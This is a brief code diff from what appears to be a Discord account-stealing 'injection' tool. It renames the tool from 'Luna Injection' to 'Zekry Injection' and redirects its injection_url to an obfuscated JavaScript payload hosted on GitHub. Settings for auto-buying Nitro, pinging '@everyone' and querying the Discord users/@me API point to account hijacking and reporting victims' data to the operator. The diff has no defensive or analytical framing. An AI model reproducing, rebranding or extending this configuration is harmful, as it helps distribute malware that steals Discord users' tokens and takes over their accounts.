@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
+  embed_name: 'Zekry Injection', 
   embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Zekryy/zekry-injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
